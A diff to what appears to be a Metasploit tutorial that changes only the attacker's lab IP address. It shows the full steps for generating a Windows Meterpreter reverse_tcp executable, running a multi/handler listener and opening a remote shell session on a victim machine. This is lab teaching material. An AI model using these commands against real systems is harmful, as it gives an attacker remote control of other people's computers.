@@ -54,7 +54,7 @@ In this demonstration, we have two boxes:
 **Box A:**
 
 * The attacker's box that receives the payload session
-* IP is: 192.168.1.64 (ifconfig)
+* IP is: 192.168.1.123 (ifconfig)
 * On the same network as the victim machine
 
 **Box B:**
@@ -72,11 +72,11 @@ On the attacker's box, I run msfpayload like the following (or msfvenom, whateve
 
 
 ```bash
-$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.64 lport=4444 X > /tmp/iambad.exe  
+$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X > /tmp/iambad.exe  
 Created by msfpayload (http://www.metasploit.com).  
 Payload: windows/meterpreter/reverse_tcp  
 Length: 287  
-Options: {"LHOST"=>"192.168.1.64", "LPORT"=>"4444"}  
+Options: {"LHOST"=>"192.168.1.123", "LPORT"=>"4444"}  
 ```
 
 **Step 2: I copy my executable payload to Box B (my victim machine)**
@@ -90,13 +90,13 @@ $ ./msfconsole -q
 msf > use exploit/multi/handler  
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
 payload => windows/meterpreter/reverse_tcp  
-msf exploit(handler) > set lhost 192.168.1.64  
-lhost => 192.168.1.64  
+msf exploit(handler) > set lhost 192.168.1.123
+lhost => 192.168.1.123 
 msf exploit(handler) > set lport 4444  
 lport => 4444  
 msf exploit(handler) > run  
   
-[*] Started reverse handler on 192.168.1.64:4444  
+[*] Started reverse handler on 192.168.1.123:4444  
 [*] Starting the payload handler...  
 ```
 
@@ -114,16 +114,16 @@ $ ./msfconsole -q
 msf > use exploit/multi/handler  
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
 payload => windows/meterpreter/reverse_tcp  
-msf exploit(handler) > set lhost 192.168.1.64  
-lhost => 192.168.1.64  
+msf exploit(handler) > set lhost 192.168.1.123
+lhost => 192.168.1.123
 msf exploit(handler) > set lport 4444  
 lport => 4444  
 msf exploit(handler) > run  
   
-[*] Started reverse handler on 192.168.1.64:4444  
+[*] Started reverse handler on 192.168.1.123:4444  
 [*] Starting the payload handler...  
 [*] Sending stage (770048 bytes) to 192.168.1.80  
-[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500  
+[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500  
 meterpreter >  
 ```
 
